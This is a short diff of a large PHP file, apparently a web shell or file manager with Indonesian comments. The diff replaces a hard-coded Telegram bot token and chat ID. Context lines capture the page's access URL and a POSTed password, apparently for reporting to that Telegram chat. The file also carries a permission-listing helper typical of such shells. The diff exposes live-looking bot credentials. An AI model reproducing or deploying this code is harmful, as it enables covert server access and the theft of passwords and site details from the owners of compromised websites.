@@ -1,6 +1,6 @@
 <?php
-$botToken = "7322478770:AAFCoP-jCy1cJ2DCqv45rkwt9toJYBPEITA"; // Ganti dengan token bot Anda
-$chatID = "-1002348135957"; // Ganti dengan chat ID grup Anda
+$botToken = "8329089699:AAHGlLYJuNJOI2SD4sPpWuBZp7F8yFrkUv0"; // Ganti dengan token bot Anda
+$chatID = "1383301930"; // Ganti dengan chat ID grup Anda
 $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; // URL akses
 $password = isset($_POST['password']) ? $_POST['password'] : 'Tidak ada password';
 
@@ -1763,4 +1763,5 @@ function perms($file)
         (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
+
 ?>
